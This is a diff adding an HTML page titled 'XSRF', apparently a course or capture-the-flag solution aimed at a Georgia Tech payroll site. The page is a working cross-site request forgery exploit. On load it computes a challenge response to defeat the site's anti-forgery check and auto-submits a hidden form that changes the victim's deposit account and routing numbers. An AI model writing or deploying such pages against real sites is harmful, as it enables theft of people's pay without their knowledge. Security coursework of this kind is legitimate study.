@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>XSRF</title>
+  </head>
+  <body onload="onBodyLoad()">
+    <form action="http://payroll.gatech.edu/account.php" onsubmit="reloadPage()" method="POST">
+      <input type="hidden" name="account" value = "3102022667">
+      <input type="hidden" name="routing" value = "2582498581">
+      <input type = "hidden" name = "action" value = "save">
+      <input type="hidden" name="RWFzdGVyRWdnRm9yVGFyZ2V0MVNwcmluZzIwMjAtTm9PbmVXaWxsS25vdz0p" value="RWFzdGVyRWdnRm9yVGFyZ2V0MVNwcmluZzIwMjAtTm9PbmVXaWxsS25vdz0p">
+      <input type="hidden" name="varId" value="42">
+      <input type = "hidden" name = "challenge" value = "1">
+      <input id = "response" type = "hidden" name = "response">
+
+
+    </form>
+    <script type="text/javascript">
+      
+      var val = 1;
+      function reloadPage(){
+        window.open("http://payroll.gatech.edu/account.php","_self")
+      }
+
+      function onBodyLoad(){
+         calcResponse();
+         document.forms[0].submit();
+	 
+      }
+
+      
+      function calcResponse(){
+        var totLength = "310202266712582498581";  
+        console.log('totLength = ' + totLength);
+        for (var i = 0; i < totLength.length; i++) {
+          val = (13337 * val + totLength.charCodeAt(i)) % 100000;
+        }
+        document.getElementById("response").value = val;
+      }
+    </script>
+  </body>
+</html>
